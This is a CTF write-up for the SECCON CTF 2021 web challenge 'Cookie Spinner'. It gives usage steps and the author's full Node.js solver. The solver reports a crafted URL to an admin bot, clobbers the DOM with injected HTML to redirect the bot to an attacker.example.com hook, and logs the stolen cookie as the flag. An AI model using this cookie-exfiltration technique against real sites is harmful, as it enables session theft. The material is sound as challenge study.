---
title: "Cookie Spinner - SECCON CTF 2021"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "cookie", "spinner", "web", "seccon-ctf-2021"]
summary: "Do you like cookies? If so, go here now!"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/cookie-spinner"
license: "none stated"
ctf:
  name: "SECCON CTF 2021"
  year: 2021
  challenge: "Cookie Spinner"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/cookie-spinner>
- **CTF:** SECCON CTF 2021

---

# [web] Cookie Spinner

## Description

Do you like cookies? If so, go `[here](http://153.127.199.64:3000)` now!

## Attachments

- [dist](files/dist)

## Usage

Launch a challenge server:

```
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_URL=http://localhost:3000 \
    -e HOOK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202112_SECCON_CTF_2021/web/cookie-spinner/solver/index.js>

```javascript
const fastify = require("fastify")();
const fetch = (...args) =>
  import("node-fetch").then(({ default: fetch }) => fetch(...args));

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_URL = process.env.SECCON_URL || fail("SECCON_URL not found");
const HOOK_URL = process.env.HOOK_URL || fail("HOOK_URL not found");

fastify.get("/", async (request, reply) => {
  const flag = request.query.cookie;
  console.log(flag); // Got flag!
  reply.send(flag);
});

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const report = async () => {
  const maxIter = 5;

  let iter = 0;
  while (iter++ < maxIter) {
    await sleep(5000);

    try {
      const pingRes = await fetch(HOOK_URL);
      if (pingRes.status !== 200) {
        throw new Error(`status code for ${HOOK_URL}: ${pingRes.status}`);
      }

      const view = `
        <form>
          <input id="form">
        </form>
        <a id="form" name="location" href="${HOOK_URL}"></a>
      `;

      const reportUrl = `http://web:3000/?window=form&view=${encodeURIComponent(
        view
      )}`;
      const body = new URLSearchParams();
      body.append("url", reportUrl);
      const reportRes = await fetch(`${SECCON_URL}/report`, {
        method: "POST",
        body,
      });
      if (reportRes.status !== 200) {
        throw new Error(`status code for ${url}: ${reportRes.status}`);
      }

      const text = await reportRes.text();
      console.log(text);
      break;
    } catch (e) {
      console.log(e);
    }
  }

  if (iter === maxIter) {
    fail("Failed to exploit");
  }
};

const start = async () => {
  try {
    const port = 8080;
    await fastify.listen(port, "0.0.0.0").then(async () => {
      console.log(`Listening at ${port}`);
      await report();
      await sleep(5 * 1000);
      process.exit(0);
    });
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};
start();
```
